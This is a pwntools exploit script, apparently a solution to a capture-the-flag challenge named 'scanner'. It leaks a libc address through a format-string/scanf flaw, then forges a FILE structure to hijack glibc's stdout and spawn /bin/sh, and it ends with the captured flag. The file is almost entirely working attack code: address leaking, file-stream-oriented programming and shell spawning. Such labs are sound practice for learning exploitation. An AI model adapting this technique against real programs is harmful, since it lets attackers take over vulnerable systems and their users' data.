from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./scanner_patched', '''
    b *(scan+145)
    b *(scan+162)
    continue
''')

# p = remote('scanfun.harkonnen.b01lersc.tf', 8443, ssl=True)

# Leak the LSBs of the _IO_2_1_stdout_
p.recvuntil(b'A hint for you. Just a byte, no more [')
lsb_3 = int(p.recvuntil(b']\n', drop=True), 16)
lsb_2 = 0xb7
lsb_1 = 0x80

# Put _IO_2_1_stdout_ on the stack
p.recvuntil(b'What do you want to scan?\n')
p.sendline(b'%16$11c '+b'A'*8+bytes([lsb_1, lsb_2, lsb_3]))

# Leak the libc base address with _IO_2_1_stdout_ primitive
p.recvuntil(b'What do you want to scan?\n')
p.sendline(b'%19$35c '+p64(0xfbad1887)+p64(0)*3+bytes([lsb_1, lsb_2, lsb_3]))
glibc_base_addr = u64(p.recvuntil(b'What do you want to scan?\n', drop=True)[0x28:0x30])-0x21b803
log.info(f'glibc base address: {hex(glibc_base_addr)}')

# Perform FSOP
glibc_e = ELF('./libc.so.6')
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym['system']
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._lock = glibc_base_addr+glibc_e.sym['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x200
fake.unknown2=p64(0)*2+p64(glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.sym['_IO_wfile_jumps']-0x18)
p.sendline(f'%19${len(bytes(fake))}c '.encode()+bytes(fake))

p.interactive()

# bctf{bUt_wh0_sc4nfs_the_5canf3r5_psof2s}